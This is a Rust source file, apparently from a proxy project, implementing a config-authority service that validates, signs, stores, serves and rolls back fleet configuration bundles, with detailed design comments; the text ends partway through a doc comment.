// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Soap Bucket LLC

//! Config-authority publisher: validate a configuration, sign it, and
//! serve it to subscribers.
//!
//! The counterpart to [`crate::config_subscriber`]. That module pulls,
//! verifies, merges, and applies; this one validates, signs, stores, and
//! serves. The two agree on one wire contract, documented below and
//! pinned by a test that points the real subscriber at the real authority
//! in process.
//!
//! # Wire contract
//!
//! One endpoint on its own listener, so a non-SBproxy server (a managed
//! control plane, say) can implement it:
//!
//! ```text
//! GET /config-authority/v1/bundle
//! Authorization: Bearer sbca1.<credential-id>.<secret>
//! X-Sbproxy-Subscriber-Id: edge-01
//! If-None-Match: "7-sha256:2c26b46b68ffc68ff99b453c1d3041341340d0d0d0d0d0d0d0d0d0d0d0d0d0d0"
//! ```
//!
//! ```text
//! HTTP/1.1 200 OK
//! Content-Type: application/json
//! ETag: "8-sha256:fcde2b2edba56bf408601fb721fe9b5c338d10ee429ea04fae5511b68fbf8fb9"
//! Cache-Control: no-store
//!
//! {"schema_version":1,"bundle":{...},"key_id":"...","algorithm":"ed25519","signature":"..."}
//! ```
//!
//! The body is a `SignedConfigBundle`, exactly the shape
//! `sbproxy_config::config_bundle` defines. The ETag is
//! `"<revision>-<content_digest>"`, quoted, and is byte-identical to what
//! [`crate::config_subscriber::cursor_etag`] renders from a subscriber's
//! cursor: the revision is what an authority compares, and the digest is
//! what makes a same-revision content change visible rather than a silent
//! `304`.
//!
//! Answers, and what each one means:
//!
//! | Status | Meaning |
//! |---|---|
//! | `200` | A bundle, with its `ETag`. |
//! | `304` | `If-None-Match` matched the current bundle. No body. |
//! | `401` | No bearer credential, or one that does not authenticate. |
//! | `403` | A valid credential that has been revoked, or a subscriber-ID header that disagrees with it. |
//! | `404` | Nothing published yet, or any path other than the bundle path. |
//! | `405` | Any method other than `GET`. |
//! | `429` | Past the per-subscriber or the fleet-wide rate limit. |
//!
//! `If-None-Match` accepts a comma-separated list and `*`, and tolerates
//! the weak `W/` prefix, so an ordinary HTTP client library works. A
//! subscriber that sends no `If-None-Match` gets `200` every poll, which
//! is correct but wasteful; the cursor is what makes the steady state one
//! conditional request and no compile.
//!
//! # Why the bundle endpoint is not on the admin listener
//!
//! Different callers, different credentials, different blast radius. The
//! admin listener authenticates an operator with basic auth and exposes
//! the whole control surface: the config, the key store, the model host.
//! The bundle endpoint authenticates a fleet node with a long-lived
//! bearer token and exposes exactly one document. Putting a fleet
//! credential on the admin port would mean every subscriber holds a
//! credential that reaches an admin surface, so they get their own
//! listener that serves one path and 404s everything else.
//!
//! # Publish validation matches boot
//!
//! [`crate::config_authority::ConfigAuthority::publish`] runs `compile_config`, then
//! [`crate::pipeline::CompiledPipeline::from_config_for_validation`], then
//! `validate_model_runtime`: the same three steps `sbproxy validate` runs,
//! in the same order. `compile_config` alone leaves `action`, `policies`,
//! `transforms`, and `authentication` as opaque JSON, so a typo inside a
//! policy entry would publish clean and then fail on every subscriber at
//! once. That is a fleet-wide outage caused by a validation gap, which is
//! the worst kind.
//!
//! The construction step is deliberately the `_for_validation`
//! constructor and not `from_config`. The runtime constructor spawns
//! health-check probes that outlive the pipeline they came from and keep
//! hitting upstreams; publish validates on every call, so it is the
//! highest-frequency place that leak could be reintroduced.
//!
//! # A git-backed authority
//!
//! [`crate::config_authority::ConfigAuthority::publish`] resolves a
//! `source:` block in the payload before it validates or signs anything,
//! so a customer can keep their configuration in their own repository
//! and have this authority sign and distribute it. What travels is the
//! resolved document, never the pointer: signing the pointer would ship
//! every subscriber a URL to fetch for itself, which is transport trust
//! rather than the signed guarantee this endpoint promises.
//!
//! The resolved document is then screened like any other payload, so a
//! repository whose configuration declares its own `source:` block is
//! refused. `source` is on the deny list because the authority overlays
//! a base document and does not get to choose where that base comes
//! from.
//!
//! # Payload scope
//!
//! A published payload is validated as a configuration in its own right,
//! because that is all the authority can see: under `mode: overlay` the
//! document that actually boots is the payload merged over each
//! subscriber's local file, and the authority does not have those files.
//! So the checks here catch everything wrong with the payload and nothing
//! that only shows up in combination with a particular subscriber's base
//! document. An `${VAR}` the authority cannot resolve is warned about
//! rather than refused for the same reason: it may well resolve on the
//! subscriber, and if it does not, the subscriber refuses it there.
//!
//! # Announcing a publication to a cluster
//!
//! A successful publication also announces `{revision, digest, authority_id}`
//! into typed cluster state, so a subscriber that is a mesh member pulls in
//! seconds instead of waiting out its poll interval. See
//! [`crate::config_gossip`]. It is an accelerator on top of a mechanism that
//! is already complete: the conditional GET above is what every subscriber
//! relies on, mesh member or not, and an announcement that never lands costs
//! propagation speed and nothing else. Nothing about a publication's success
//! depends on it.

use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex};
use std::time::{SystemTime, UNIX_EPOCH};

use arc_swap::ArcSwapOption;
use rand::rngs::OsRng;
use rand::RngCore as _;
use sbproxy_config::config_authority::{
    AuthorityStore, AuthorityStoreError, CredentialSeed, IssuedSubscriberCredential,
    SubscriberAuthError, CREDENTIAL_ID_BYTES, CREDENTIAL_SECRET_BYTES,
};
use sbproxy_config::config_bundle::{
    BundleMode, ConfigBundle, ConfigBundleSigner, SignedConfigBundle,
};
use sbproxy_config::types::{ConfigAuthorityPublishConfig, ConfigAuthorityPublishTlsConfig};

use crate::config_subscriber::BUNDLE_ENDPOINT_PATH;

/// `POST` here to validate, sign, and publish a configuration. Admin
/// listener, operator credentials.
pub const PUBLISH_PATH: &str = "/admin/config-authority/publish";

/// `POST` here to republish the previous stored revision's payload. Admin
/// listener, operator credentials.
pub const ROLLBACK_PATH: &str = "/admin/config-authority/rollback";

/// `GET` here for the current revision, digest, key ID, and per-subscriber
/// last-seen revision.
pub const STATUS_PATH: &str = "/admin/config-authority/status";

/// `GET` to list registered subscribers, `POST` to register one.
pub const SUBSCRIBERS_PATH: &str = "/admin/config-authority/subscribers";

/// `POST` here to revoke a credential or every credential a subscriber
/// holds.
pub const SUBSCRIBER_REVOKE_PATH: &str = "/admin/config-authority/subscribers/revoke";

/// Response schema version for every admin route in this module.
pub const ADMIN_SCHEMA_VERSION: u32 = 1;

/// Largest request head the bundle listener reads, in bytes.
///
/// The endpoint takes no body, so anything past a few kilobytes of headers
/// is a client that has lost the plot or one probing for a buffer to
/// overrun.
const MAX_BUNDLE_REQUEST_HEAD_BYTES: usize = 16 * 1024;

/// How long the bundle listener waits for a complete request head.
///
/// A connection that opens and says nothing otherwise holds a task
/// forever, which is a slow-loris with extra steps.
const BUNDLE_REQUEST_HEAD_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(10);

/// Response tuple shared with the other admin dispatchers.
type AdminResponse = (u16, &'static str, String);

/// The current bundle, pre-rendered for the wire.
///
/// Serving a fetch touches no lock and re-encodes nothing: the JSON body
/// and the ETag are computed once per publication and swapped in. A fleet
/// polling in lockstep after a rolling restart therefore costs one
/// `Arc` clone each rather than one 4 MiB serialization each.
#[derive(Debug)]
struct ServedBundle {
    revision: u64,
    content_digest: String,
    issued_at_unix_ms: u64,
    etag: String,
    body: Arc<Vec<u8>>,
}

impl ServedBundle {
    fn new(signed: &SignedConfigBundle) -> Result<Self, PublishError> {
        let body = signed
            .to_json()
            .map_err(|error| PublishError::Internal(format!("encode signed bundle: {error}")))?;
        Ok(Self {
            revision: signed.bundle.revision,
            content_digest: signed.bundle.content_digest.clone(),
            issued_at_unix_ms: signed.bundle.issued_at_unix_ms,
            etag: etag_for(signed.bundle.revision, &signed.bundle.content_digest),
            body: Arc::new(body),
        })
    }
}

/// The entity tag for one revision and content digest.
///
/// Must stay byte-identical to [`crate::config_subscriber::cursor_etag`].
/// The round-trip test in `tests/config_authority.rs` is what keeps the
/// two from drifting apart.
#[must_use]
pub fn etag_for(revision: u64, content_digest: &str) -> String {
    format!("\"{revision}-{content_digest}\"")
}

/// Why a publication was refused.
///
/// Marked `#[non_exhaustive]` like the sibling `AggregateError` and
/// [`RollbackError`], for the same reason: a publish has more than
/// these ways to fail and a caller that matches exhaustively would
/// break on the next one.
#[derive(Debug, thiserror::Error)]
#[non_exhaustive]
pub enum PublishError {
    /// The payload was empty or past the accepted size.
    #[error("config authority publish rejected: {0}")]
    Invalid(String),
    /// The payload claims a path every subscriber owns outright.
    #[error("config authority publish rejected: the payload sets path(s) every subscriber owns and would refuse: {}. Remove them; a subscriber's listeners, TLS, admin surface, secrets, cluster membership, and its own config_authority block are not the fleet's to set", .0.join(", "))]
    DeniedPaths(Vec<String>),
    /// The payload did not compile.
    #[error("config authority publish rejected: the payload does not compile: {0}")]
    Compile(String),
    /// The payload compiled but a module would not construct, so it would
    /// fail at boot on every subscriber.
    #[error("config authority publish rejected: the payload compiles, but a module failed to construct, so every subscriber would refuse it at boot: {0}")]
    Construct(String),
    /// The payload's managed-model desired state is not valid.
    #[error("config authority publish rejected: the payload has invalid model-host desired state, so every subscriber would refuse it at boot: {0}")]
    ModelRuntime(String),
    /// Signing failed.
    #[error("config authority publish failed while signing: {0}")]
    Signing(String),
    /// The durable store refused or could not persist the publication.
    ///
    /// Reached only **after** the revision number was reserved, so the
    /// number is spent. A store failure while reserving it is
    /// [`Self::Reserve`], which is a different answer to
    /// `revision_consumed` and the reason the two are separate variants
    /// rather than one `#[from]`.
    #[error("config authority publish failed at the store: {0}")]
    Store(#[from] AuthorityStoreError),
    /// The durable store could not reserve a revision number.
    ///
    /// Carries the same `store_failed` code on the wire as
    /// [`Self::Store`], because an operator's remedy is identical, but
    /// reports `revision_consumed: false`: `reserve_revision` persists
    /// the new high-water mark before it returns, so a failure inside it
    /// leaves the counter exactly where it was. ENOSPC is the case that
    /// reaches this.
    #[error("config authority publish failed at the store: {0}")]
    Reserve(AuthorityStoreError),
    /// The payload reaches for a host resource only the subscriber's own
    /// operator may reach (WOR-2433).
    #[error("config authority publish rejected: {0}")]
    Confinement(String),
    /// Something that should not be reachable went wrong.
    #[error("config authority publish failed: {0}")]
    Internal(String),
}

impl PublishError {
    /// Stable machine-readable code for the admin response.
    ///
    /// Distinguishes a payload the operator must fix from a failure on the
    /// authority itself, so a caller can retry the second class and must
    /// not retry the first.
    #[must_use]
    pub fn code(&self) -> &'static str {
        match self {
            Self::Invalid(_) => "invalid_payload",
            Self::DeniedPaths(_) => "denied_path",
            Self::Compile(_) => "compile_failed",
            Self::Construct(_) => "construct_failed",
            Self::ModelRuntime(_) => "model_runtime_invalid",
            Self::Confinement(_) => "confinement_refused",
            Self::Signing(_) => "signing_failed",
            Self::Store(_) | Self::Reserve(_) => "store_failed",
            Self::Internal(_) => "internal",
        }
    }

    /// Whether this failure happened **after** the revision number was
    /// reserved, so the number is spent.
    ///
    /// Every validation step runs before [`AuthorityStore::reserve_revision`],
    /// so a payload the operator has to fix costs nothing and the next
    /// publication takes the number this one would have had. Everything
    /// after the reservation returns is spent, and a reservation is
    /// never given back: the counter is a promise that a number is never
    /// reissued, which is what makes a subscriber's anti-replay cursor
    /// safe.
    ///
    /// The boundary is the reservation *returning*, not the call being
    /// made. `reserve_revision` persists the new high-water mark before
    /// it returns, so a failure inside it leaves the counter untouched;
    /// that case is [`Self::Reserve`] and answers `false`, while
    /// [`Self::Store`] is only reachable from `commit`, after the number
    /// is already spent. Collapsing the two into one `#[from]` made an
    /// ENOSPC during reservation claim a gap that is not there.
    ///
    /// The admin response reports this as `revision_consumed`. Reporting
    /// `false` unconditionally was wrong for exactly these three
    /// variants, and an operator reading it would expect the next
    /// publish to reuse the number.
    const fn consumed_revision(&self) -> bool {
        matches!(self, Self::Signing(_) | Self::Store(_) | Self::Internal(_))
    }

    /// Whether the payload is at fault, as opposed to the authority.
    ///
    /// Drives the HTTP status: a bad payload is a `400`, a broken
    /// authority is a `500`. Getting this backwards would have an operator
    /// re-reading a correct config while the disk is full.
    #[must_use]
    pub fn is_payload_fault(&self) -> bool {
        matches!(
            self,
            Self::Invalid(_)
                | Self::DeniedPaths(_)
                | Self::Compile(_)
                | Self::Construct(_)
                | Self::ModelRuntime(_)
        )
    }
}

/// What one accepted publication produced.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PublishOutcome {
    /// Revision assigned to this publication.
    pub revision: u64,
    /// `sha256:<hex>` of the payload.
    pub content_digest: String,
    /// Entity tag subscribers will compare against.
    pub etag: String,
    /// Apply mode stamped into the envelope.
    pub mode: BundleMode,
    /// Publication time in unix milliseconds.
    pub issued_at_unix_ms: u64,
}

/// Why a rollback was refused.
///
/// `#[non_exhaustive]` because a rollback has more than two ways to
/// fail and this list has already grown once. Matches the sibling
/// [`crate::config_aggregator::AggregateError`], which is marked the
/// same way for the same reason.
#[derive(Debug, thiserror::Error)]
#[non_exhaustive]
pub enum RollbackError {
    /// The store holds no previous revision to go back to.
    #[error(
        "config authority rollback rejected: no previous revision is stored (current revision \
         is {published}), and a rollback needs a revision to go back to"
    )]
    NoPreviousRevision {
        /// Revision currently served. Zero means nothing was ever published.
        published: u64,
    },
    /// The archive does not hold the named revision.
    ///
    /// Lists what is available rather than only saying no, because an
    /// operator who guessed once will otherwise guess again.
    #[error(
        "config authority rollback rejected: revision {requested} is not in the archive; \
         available revisions are {available}"
    )]
    NotArchived {
        /// Revision the caller asked for.
        requested: u64,
        /// Revisions the ring holds, ascending, rendered for the message.
        available: String,
    },
    /// An archived bundle is on disk but could not be read back.
    #[error("config authority rollback failed: {0}")]
    Store(#[from] sbproxy_config::config_authority::AuthorityStoreError),
    /// The previous payload no longer publishes, or could not be signed or
    /// stored.
    ///
    /// Revalidating is the point: a payload that published cleanly before a
    /// binary upgrade need not still construct after one, and republishing
    /// it unchecked would push a configuration the fleet then refuses at
    /// boot.
    #[error(transparent)]
    Publish(#[from] PublishError),
}

impl RollbackError {
    /// Stable machine-readable code for the admin response.
    #[must_use]
    pub fn code(&self) -> &'static str {
        match self {
            Self::NoPreviousRevision { .. } => "no_previous_revision",
            Self::NotArchived { .. } => "revision_not_archived",
            Self::Store(_) => "archive_unreadable",
            Self::Publish(error) => error.code(),
        }
    }

    /// Whether the operator's request or the stored state is at fault, as
    /// opposed to the authority itself. Drives the HTTP status.
    #[must_use]
    pub fn is_request_fault(&self) -> bool {
        match self {
            Self::NoPreviousRevision { .. } | Self::NotArchived { .. } => true,
            Self::Store(_) => false,
            Self::Publish(error) => error.is_payload_fault(),
        }
    }

    /// Whether a revision number was spent before this failed.
    ///
    /// Only the republication can reach a reservation: refusing a
    /// target the ring does not hold, and failing to read an archived
    /// file, both happen before anything is published.
    const fn consumed_revision(&self) -> bool {
        match self {
            Self::NoPreviousRevision { .. } | Self::NotArchived { .. } | Self::Store(_) => false,
            Self::Publish(error) => error.consumed_revision(),
        }
    }
}

/// What one accepted rollback produced.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct RollbackOutcome {
    /// Revision whose payload was republished.
    pub restored_from_revision: u64,
    /// Revision that was current before the rollback.
    pub replaced_revision: u64,
    /// The new publication carrying the restored payload. Its `revision` is
    /// a fresh number, above `replaced_revision`, because a subscriber's
    /// cursor refuses anything else.
    pub outcome: PublishOutcome,
}

/// One inbound bundle fetch, reduced to the fields that decide the answer.
///
/// Separating the decision from the socket is what makes every status in
/// the table above testable without a listener, and what lets the
/// listener stay a thin frame reader.
#[derive(Debug, Default, Clone)]
pub struct BundleFetch<'a> {
    /// Request target, query string included.
    pub path: &'a str,
    /// Request method.
    pub method: &'a str,
    /// Bearer credential from `Authorization`, without the scheme.
    pub credential: Option<&'a str>,
    /// `x-sbproxy-subscriber-id`, when the client sent one.
    pub subscriber_id: Option<&'a str>,
    /// `If-None-Match`, verbatim.
    pub if_none_match: Option<&'a str>,
    /// What the subscriber says it last **applied** (WOR-2464), as
    /// distinct from what it was last served.
    ///
    /// Already parsed by `parse_apply_report`, which is what the
    /// listener calls: a partial or unrecognized report is `None` by the
    /// time it reaches here rather than something this decision has to
    /// re-validate. (Not linked: that function is crate-private, and a
    /// private intra-doc link on a public item fails the docs lane.)
    ///
    /// `None` for a subscriber that sent none of the report headers: an
    /// older build, or one that has not completed a cycle yet. Handled
    /// as **unknown** rather than as an error, which is the acceptance
    /// line, and rendered as unknown rather than as applied, which is
    /// the point of the ticket.
    pub apply_report: Option<sbproxy_config::SubscriberApplyReport>,
    /// Peer address, used as the rate-limit key before a credential is
    /// known.
    pub peer: &'a str,
}

/// Read the apply-report headers off one request head (WOR-2464).
///
/// `None` when the report is absent or unusable. Strict on the two
/// fields that carry meaning: an unrecognized status and an unparseable
/// revision both make the whole report `None`. A partial report would be
/// worse than none, because the status page would then render a status
/// against a revision the node never named. The free-text fields are
/// permissive and bounded again by
/// [`sbproxy_config::SubscriberApplyReport`] on the way into the store.
///
/// Lives here rather than in the frame reader so the parsing rules sit
/// next to [`ConfigAuthority::serve_bundle_at`], which is what acts on
/// them, and so a test can drive a literal request head through the same
/// function the listener uses.
pub(crate) fn parse_apply_report(head: &str) -> Option<sbproxy_config::SubscriberApplyReport> {
    let status = sbproxy_config::ApplyStatus::parse(
        header_value(head, crate::config_subscriber::APPLY_STATUS_HEADER)?.trim(),
    )?;
    let revision: u64 = header_value(head, crate::config_subscriber::APPLIED_REVISION_HEADER)?
        .trim()
        .parse()
        .ok()?;
    let text = |name: &str| {
        header_value(head, name)
            .map(|value| value.trim().to_string())
            .filter(|value| !value.is_empty())
    };
    Some(sbproxy_config::SubscriberApplyReport {
        status,
        revision,
        config_hash: text(crate::config_subscriber::APPLIED_HASH_HEADER).unwrap_or_default(),
        error: text(crate::config_subscriber::APPLY_ERROR_HEADER),
        soak_verdict: text(crate::config_subscriber::SOAK_VERDICT_HEADER),
        fallback_active: text(crate::config_subscriber::FALLBACK_ACTIVE_HEADER).as_deref()
            == Some("true"),
        reported_at_unix_ms: None,
    })
}

/// The answer to one bundle fetch.
#[derive(Debug, Clone)]
pub struct BundleReply {
    /// HTTP status.
    pub status: u16,
    /// Entity tag, present on `200` and `304`.
    pub etag: Option<String>,
    /// Response body. Empty for `304`.
    pub body: Arc<Vec<u8>>,
    /// Stable reason label, for the access log. Never sent to the client,
    /// so it can name the real cause without telling a prober which
    /// credential IDs exist.
    pub reason: &'static str,
    /// Revision served, when one was.
    pub revision: Option<u64>,
}

impl BundleReply {
    fn plain(status: u16, reason: &'static str, body: &str) -> Self {
        Self {
            status,
            etag: None,
            body: Arc::new(body.as_bytes().to_vec()),
            reason,
            revision: None,
        }
    }

    /// The `Content-Type` for this reply.
    #[must_use]
    pub const fn content_type(&self) -> &'static str {
        "application/json"
    }
}

/// How long a subscriber may go without fetching before its report is
/// treated as stale rather than current (WOR-2464).
///
/// Ten missed polls at the default `poll_interval` of 30 seconds. Long
/// enough that jitter, a slow reload, and one unreachable cycle do not
/// flip a healthy node to `stale`; short enough that a node that has
/// stopped talking is visible inside an incident rather than after it.
/// A fleet on a longer interval than this reads `stale` between polls,
/// which is a deliberate trade: this authority does not know each
/// subscriber's configured interval, and over-reporting staleness is
/// the safe direction for a page an operator makes a rollback decision
/// on.
const SUBSCRIBER_STALE_AFTER_MS: u64 = 5 * 60 * 1_000;

/// Whether a subscriber has been heard from recently (WOR-2464).
///
/// Three states, not two. `unknown` is the honest answer after an
/// authority restart, because fetch times are held in memory only; a
/// restart must not make every subscriber look like it has gone silent.
fn poll_state(last_seen_at_unix_ms: Option<u64>, now_unix_ms: u64) -> &'static str {
    match last_seen_at_unix_ms {
        None => "unknown",
        Some(at) if now_unix_ms.saturating_sub(at) <= SUBSCRIBER_STALE_AFTER_MS => "recent",
        Some(_) => "stale",
    }
}

/// A running config authority: the signing key, the durable store, and
/// the rate limiter that bounds the bundle listener.
pub struct ConfigAuthority {
    authority_id: String,
    signer: ConfigBundleSigner,
    store: Mutex<AuthorityStore>,
    /// Pre-rendered current bundle, so a fetch neither locks the store to
    /// read it nor re-encodes it.
    served: ArcSwapOption<ServedBundle>,
    limiter: crate::admin::AdminRateLimiter,
    /// Directory relative model-host paths in a payload resolve against
    /// during validation. The authority's own store directory: a
    /// published payload's relative paths really resolve on each
    /// subscriber, so this axis of the check is advisory and the rest is
    /// not.
    validation_dir: PathBuf,
}

impl std::fmt::Debug for ConfigAuthority {
    fn fmt(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        formatter
            .debug_struct("ConfigAuthority")
            .field("authority_id", &self.authority_id)
            .field("signer", &self.signer)
            .field("current_revision", &self.current_revision())
            .finish_non_exhaustive()
    }
}

impl ConfigAuthority {
    /// Build an authority from a validated `proxy.config_authority.publish`
    /// block.
    ///
    /// Loads the signing key and opens the store, so a missing key or an
    /// unwritable directory fails here rather than at the first
    /// publication.
    ///
    /// # Errors
    ///
    /// Returns an error when the block does not validate, when the signing
    /// key cannot be loaded, when the store directory cannot be opened, or
    /// when a stored bundle cannot be re-rendered for the wire.
    pub fn from_config(publish: &ConfigAuthorityPublishConfig) -> anyhow::Result<Self> {
        publish
            .validate()
            .map_err(|error| anyhow::anyhow!("proxy.config_authority.publish: {error}"))?;
        let signer = ConfigBundleSigner::ed25519_from_seed_file(
            publish.key_id.as_str(),
            &publish.signing_key_file,
        )
        .map_err(|error| {
            anyhow::anyhow!(
                "load config authority signing key '{}': {error}",
                publish.signing_key_file
            )
        })?;
        let store = AuthorityStore::open_with_archive_keep(
            &publish.store_dir,
            &publish.authority_id,
            publish.archive_keep,
        )
        .map_err(|error| {
            anyhow::anyhow!(
                "open config authority store '{}': {error}",
                publish.store_dir
            )
        })?;
        let served = match store.current() {
            Some(signed) => Some(Arc::new(ServedBundle::new(signed)?)),
            None => None,
        };
        Ok(Self {
            authority_id: publish.authority_id.clone(),
            signer,
            validation_dir: PathBuf::from(&publish.store_dir),
            store: Mutex::new(store),
            served: ArcSwapOption::from(served),
            limiter: crate::admin::AdminRateLimiter::with_global(
                publish.rate_limit_per_subscriber_per_minute,
                publish.rate_limit_total_per_minute,
            ),
        })
    }

    /// Identity stamped into every bundle this authority signs.
    #[must_use]
    pub fn authority_id(&self) -> &str {
        &self.authority_id
    }

    /// Key ID stamped into every envelope.
    #[must_use]
    pub fn key_id(&self) -> &str {
        self.signer.key_id()
    }

    /// Public material a subscriber installs to verify this authority.
    #[must_use]
    pub fn verifying_material_base64(&self) -> String {
        self.signer.verifying_material_base64()
    }

    /// The verifying-key file body a subscriber installs.
    ///
    /// # Errors
    ///
    /// Returns an error when the JSON object cannot be encoded.
    pub fn verifying_key_file_json(&self) -> anyhow::Result<String> {
        self.signer
            .verifying_key_file_json()
            .map_err(|error| anyhow::anyhow!("render config authority verifying key file: {error}"))
    }

    /// Revision currently served. Zero means nothing has been published.
    #[must_use]
    pub fn current_revision(&self) -> u64 {
        self.served.load_full().map_or(0, |served| served.revision)
    }

    /// Entity tag of the bundle currently served.
    #[must_use]
    pub fn current_etag(&self) -> Option<String> {
        self.served.load_full().map(|served| served.etag.clone())
    }

    /// `sha256:<hex>` of the payload currently served.
    ///
    /// Exposed so a producer that composes the payload it publishes can
    /// tell, after a restart, whether what it just built is already the
    /// revision this authority is serving. Republishing an identical
    /// payload is a full pipeline rebuild on every subscriber for no
    /// configuration change (WOR-2438).
    #[must_use]
    pub fn current_content_digest(&self) -> Option<String> {
        self.served
            .load_full()
            .map(|served| served.content_digest.clone())
    }

    /// Validate, sign, store, and begin serving one configuration payload.
    ///
    /// Every check runs before a revision number is reserved, so a payload
    /// that does not compile consumes nothing and the next publication
    /// gets the number this one would have had. See the module docs for
    /// why the three validation steps are what they are.
    ///
    /// # Errors
    ///
    /// Returns [`PublishError`] naming which step refused the payload.
    /// Nothing about the served bundle changes unless the whole call
    /// succeeds.
    pub fn publish(
        &self,
        config_yaml: &str,
        mode: BundleMode,
    ) -> Result<PublishOutcome, PublishError> {
        self.publish_at(config_yaml, mode, now_unix_ms())
    }

    /// [`Self::publish`] at an explicit publication time, for tests that
    /// need a deterministic `issued_at`.
    ///
    /// # Errors
    ///
    /// As [`Self::publish`].
    pub fn publish_at(
        &self,
        config_yaml: &str,
        mode: BundleMode,
        now_unix_ms: u64,
    ) -> Result<PublishOutcome, PublishError> {
        // A git-backed authority: the document handed in may be a
        // `source:` pointer, and what gets signed and distributed has to
        // be the document that pointer resolves to. Signing the pointer
        // would ship every subscriber a repository URL to fetch for
        // itself, which is a different (and unsigned) trust story than
        // the one this endpoint promises. A payload with no `source:`
        // block resolves to itself and does no I/O.
        let resolved = crate::config_source::resolve(config_yaml)
            .map_err(|error| PublishError::Invalid(format!("{error:#}")))?;
        let config_yaml = resolved.text.as_str();
        // The resolved document is screened like any other payload, so a
        // repository whose config declares its own `source:` is refused
        // here rather than shipped to the fleet: `source` is on the deny
        // list precisely because the authority overlays a base document
        // and does not get to choose where that base comes from.
        self.validate_payload(config_yaml)?;

        // Validation passed, so the number is now safe to spend.
        let mut store = self.lock_store();
        // Not the `#[from]`: a failure *inside* the reservation leaves the
        // counter where it was, and reporting it as a spent number would
        // tell an operator to expect a gap that is not there.
        let revision = store.reserve_revision().map_err(PublishError::Reserve)?;
        let bundle = ConfigBundle::new(
            self.authority_id.as_str(),
            revision,
            mode,
            config_yaml,
            now_unix_ms,
            None,
        )
        // `Internal`, not `Invalid`: the payload already passed every
        // validation step above, and this is after `reserve_revision`,
        // so the number is spent. `Invalid` would report
        // `revision_consumed: false`, which would be a lie here.
        .map_err(|error| PublishError::Internal(error.to_string()))?;
        let signed = self
            .signer
            .sign(bundle)
            .map_err(|error| PublishError::Signing(error.to_string()))?;
        let served = ServedBundle::new(&signed)?;
        let outcome = PublishOutcome {
            revision,
            content_digest: served.content_digest.clone(),
            etag: served.etag.clone(),
            mode,
            issued_at_unix_ms: served.issued_at_unix_ms,
        };
        store.commit(signed)?;
        // Swapped in only after the commit, so a store write that fails
        // leaves the previous bundle serving rather than serving one that
        // would vanish on the next restart.
        self.served.store(Some(Arc::new(served)));
        drop(store);
        tracing::info!(
            revision,
            authority_id = %self.authority_id,
            key_id = %self.signer.key_id(),
            content_digest = %outcome.content_digest,
            mode = %format_mode(mode),
            "config authority published a new revision",
        );
        // Tell the cluster, if this node is in one. Deliberately after the
        // commit and after the swap: the announcement says "this revision is
        // being served", and saying it before that were true would have a
        // peer fetch a revision this authority might still fail to store. A
        // failure here is counted and logged, never returned, because the
        // revision is live either way and subscribers converge on their poll
        // interval without any of this.
        let announced = crate::config_gossip::announce_revision(
            self.authority_id.as_str(),
            revision,
            outcome.content_digest.as_str(),
        );
        tracing::debug!(
            revision,
            announced = announced.as_str(),
            "config revision announcement outcome",
        );
        Ok(outcome)
    }

    /// Run the boot-equivalent validation over one payload.
    ///
    /// Exposed so a dry-run path can ask "would this publish?" without
    /// spending a revision. The checks themselves live in
    /// [`validate_publish_payload`], which a caller with no authority in
    /// hand (the CLI) runs against the same code.
    ///
    /// # Errors
    ///
    /// Returns [`PublishError`] naming the step that refused it.
    pub fn validate_payload(&self, config_yaml: &str) -> Result<(), PublishError> {
        let unresolved = validate_publish_payload(config_yaml, &self.validation_dir)?;
        // Not a refusal: the reference may resolve on the subscriber, and
        // if it does not, the subscriber refuses it there rather than
        // applying the literal text. Loud, because the operator publishing
        // it is the only person who can tell which case this is.
        if !unresolved.is_empty() {
            tracing::warn!(
                refs = %unresolved.join(", "),
                authority_id = %self.authority_id,
                "config authority payload carries ${{VAR}} reference(s) this authority cannot \
                 resolve; every subscriber that cannot resolve them either will refuse the \
                 bundle rather than apply the literal text",
            );
        }
        Ok(())
    }

    /// Republish the previous stored revision's payload.
    ///
    /// The store keeps the current bundle and the one before it for exactly
    /// this. What this does *not* do is re-serve the previous revision
    /// number: a subscriber's anti-replay cursor refuses any revision that
    /// is not greater than the one it applied, so serving revision 6 again
    /// after 7 would be refused by every node that already took 7, which is
    /// a rollback that reaches nobody. Rolling back therefore means signing
    /// the previous *payload* as a new revision, which every subscriber
    /// accepts and which leaves the revision sequence monotonic.
    ///
    /// The payload is revalidated on the way through, because a payload that
    /// published cleanly before an upgrade need not still construct after
    /// one.
    ///
    /// # Errors
    ///
    /// Returns [`RollbackError::NoPreviousRevision`] when there is nothing
    /// to go back to, and [`RollbackError::Publish`] when the previous
    /// payload no longer validates or cannot be signed or stored. Nothing
    /// about the served bundle changes unless the whole call succeeds.
    pub fn rollback(&self) -> Result<RollbackOutcome, RollbackError> {
        // Copied out under the lock and the lock released, so the
        // republication below takes it fresh rather than holding it across
        // a full validation pass.
        let (restored_from_revision, mode, config_yaml, replaced_revision) = {
            let store = self.lock_store();
            let replaced_revision = store.current_revision();
            let Some(previous) = store.previous() else {
                sbproxy_observe::metrics::record_config_authority_rollback("previous", "refused");
                return Err(RollbackError::NoPreviousRevision {
                    published: replaced_revision,
                });
            };
            (
                previous.bundle.revision,
                previous.bundle.mode,
                previous.bundle.config_yaml.clone(),
                replaced_revision,
            )
        };
        let outcome = self.publish(&config_yaml, mode).inspect_err(|_| {
            sbproxy_observe::metrics::record_config_authority_rollback("previous", "refused");
        })?;
        sbproxy_observe::metrics::record_config_authority_rollback("previous", "published");
        tracing::warn!(
            revision = outcome.revision,
            restored_from_revision,
            replaced_revision,
            authority_id = %self.authority_id,
            "config authority rolled back: the payload of an earlier revision is republished \
             under a new revision number",
        );
        Ok(RollbackOutcome {
            restored_from_revision,
            replaced_revision,
            outcome,
        })
    }

    /// Republish an archived revision's payload under a new revision
    /// number.
    ///
    /// [`Self::rollback`] answers "undo the last publish"; this answers
    /// "go back to the document we were running three publishes ago". The
    /// mechanism is identical and deliberately so: the payload goes out
    /// as a **new** revision above the current one, because a
    /// subscriber's anti-replay cursor refuses anything that is not
    /// greater than what it applied. Nothing about the numbering changes
    /// just because the target is further back.
    ///
    /// The archived payload is revalidated on the way through, for the
    /// same reason a one-step rollback is: an older payload is a *more*
    /// likely candidate to have stopped constructing across a binary
    /// upgrade, not a less likely one.
    ///
    /// # Errors
    ///
    /// Returns [`RollbackError::NotArchived`] when the ring does not hold
